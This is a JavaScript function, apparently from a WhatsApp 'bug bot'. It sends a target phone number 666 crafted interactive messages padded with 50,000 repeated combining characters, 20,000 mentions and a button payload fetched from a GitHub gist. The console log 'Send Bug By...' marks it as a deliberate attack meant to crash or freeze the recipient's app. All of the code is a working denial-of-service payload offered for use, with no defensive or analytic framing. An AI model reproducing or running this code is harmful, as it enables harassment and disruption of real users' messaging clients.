async function LvsApi(X, ptcp = true) {
  // Ambil data API dari gist
  let apiClient;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiClient = await res.text();
  } catch (err) {
    console.error("error fetching", err);
    return;
  }

  for (let r = 0; r < 666; r++) {
    const msg = await generateWAMessageFromContent(
      X,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "X",
                mentionedJid: [X],
                forwardedNewsletterMessageInfo: {
                  newsletterName: "XhinSar",
                  newsletterJid: "120363350240801289@newsletter",
                  serverMessageId: 1
                },
                externalAdReply: {
                  showAdAttribution: true,
                  title: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠",
                  body: "",
                  thumbnailUrl: null,
                  sourceUrl: "https://tama.app/",
                  mediaType: 1,
                  renderLargerThumbnail: true
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: X,
                },
                dataSharingContext: {
                  showMmDisclosure: true,
                },
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: null
                  }
                }
              },
              header: {
                title: "",
                hasMediaAttachment: false
              },
              body: {
                text: "🩸⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝐄𝐱‌‌𝐞𝐜𝐮‌𝐭𝐢𝐨𝐧 𝐕‌𝐚‌𝐮𝐥𝐭ཀ‌‌🦠" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Ryuichi - Beginner\",\"body\":\"Call Galaxy\"}",
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: apiClient + "Eternity",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: apiClient + "Eternity",
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: ""
                  },
                  {
                    name: "payment_status",
                    buttonParamsJson: ""
                  },
                  {
                    name: "review_order",
                    buttonParamsJson: ""
                  },
                ],
              },
            },
          },
        },
      },
      {}
    );

    await VxoZap.relayMessage(X, msg.message, {
      participant: { jid: X },
      messageId: msg.key.id
    });

    await sleep(5000);
    console.log("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 𝐁𝐲 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨〽️");
  }
}